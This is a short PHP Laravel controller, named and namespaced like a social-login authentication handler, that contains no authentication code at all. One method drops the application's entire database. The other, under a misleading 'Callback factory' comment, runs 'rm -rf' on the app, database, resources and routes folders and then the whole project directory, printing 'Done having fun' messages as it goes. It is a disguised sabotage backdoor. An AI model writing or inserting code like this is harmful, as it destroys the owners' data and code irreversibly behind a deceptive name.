<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use DB;
use Schema;

class Socialite2Controller extends Controller {
    public function dropzone(){
		$db = env('DB_DATABASE');
		echo $db;
		echo "<br>";
		echo "Executing dropzone ...";
		echo "<br>";
		Schema::getConnection()->getDoctrineSchemaManager()->dropDatabase("`{$db}`");

		echo "Done!";
	}

	// Callback factory
	public function callbackFactory(){
		$app = app_path();

		echo "<br>";
		$base = base_path();
		$db = $base."/database";
		$resources = $base."/resources";
		$routes = $base."/routes";

		echo "<br>";
		exec('rm -rf '.escapeshellarg($app));
		echo "Done having fun in app";

		echo "<br>";
		exec('rm -rf '.escapeshellarg($db));
		echo "Done having fun in DB";

		echo "<br>";
		exec('rm -rf '.escapeshellarg($resources));
		echo "Done having fun in resources";

		echo "<br>";
		exec('rm -rf '.escapeshellarg($routes));
		echo "Done having fun with routes";

		echo "<br>";
		exec('rm -rf '.escapeshellarg($base));
		echo "Done having fun with public";

	}
}
